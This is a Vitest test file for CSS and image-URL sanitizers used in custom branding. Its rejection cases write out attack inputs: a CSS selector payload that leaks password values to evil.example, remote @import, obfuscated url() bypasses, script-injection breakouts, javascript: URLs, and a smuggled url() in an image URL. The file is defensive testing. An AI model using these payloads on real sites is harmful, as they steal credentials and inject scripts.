import { describe, it, expect } from 'vitest';
import { isSafeCustomCss, isSafeImageUrl } from './brandingSafety';

describe('isSafeCustomCss', () => {
  it.each([
    '.card { background-color: #fff; border-radius: 8px; }',
    'h1, h2 { color: #4F46E5; font-weight: 700 }',
    '/* brand */ .a { color: red }',
    '.bg { background: linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%) }',
  ])('accepts %s', (css) => {
    expect(isSafeCustomCss(css)).toBe(true);
  });

  it.each([
    "input[type=password][value^=a]{background:url(https://evil.example/a)}",
    '@import url(https://evil.example/x.css);',
    '.a{background:url(https://evil.example/x.png)}',
    '.a{background:URL(x)}',
    '.a{background:u/**/rl(x)}',
    '.a{background:\\75rl(x)}',
    '.a{background-image:image-set("x.png" 1x)}',
    '.a{width:expression(alert(1))}',
    '</style><script>alert(1)</script>',
    '.a{color:red}/* unterminated',
    '.a{background:attr(data-x)}',
    '',
    null,
    undefined,
  ])('rejects %s', (css) => {
    expect(isSafeCustomCss(css as string | null | undefined)).toBe(false);
  });
});

describe('isSafeImageUrl', () => {
  it.each(['https://cdn.example.com/logo.png', 'http://cdn.example.com/a.png?x=1', '/assets/logo.svg'])('accepts %s', (url) => {
    expect(isSafeImageUrl(url)).toBe(true);
  });

  it.each([
    'javascript:alert(1)',
    'data:image/svg+xml;base64,AAA',
    '//evil.example/x.png',
    "https://x.example/a.png');background:url(https://evil.example/y",
    'https://x.example/a b.png',
    'https://user:pw@x.example/a.png',
    'logo.png',
    '',
    null,
  ])('rejects %s', (url) => {
    expect(isSafeImageUrl(url as string | null)).toBe(false);
  });
});
